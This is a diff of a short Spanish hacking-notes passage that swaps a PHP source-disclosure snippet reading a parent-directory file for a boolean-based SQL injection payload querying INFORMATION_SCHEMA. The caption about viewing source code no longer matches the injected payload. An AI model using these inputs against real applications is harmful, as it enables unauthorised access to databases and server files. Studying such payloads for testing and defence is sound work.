@@ -22,8 +22,6 @@ Con este codigo podemos conocer los archivos en el servidor
 
 
 ```php
-<?php
-  show_source("../archivos.php");
-?>
+hola' RLIKE (SELECT IF(COUNT(DISTINCT(table_schema))=1, 'hola', 0x28) FROM INFORMATION_SCHEMA.TABLES) AND 'TMTd'='TMTd
 ```
 Con este codigo podemos ver codigo fuente
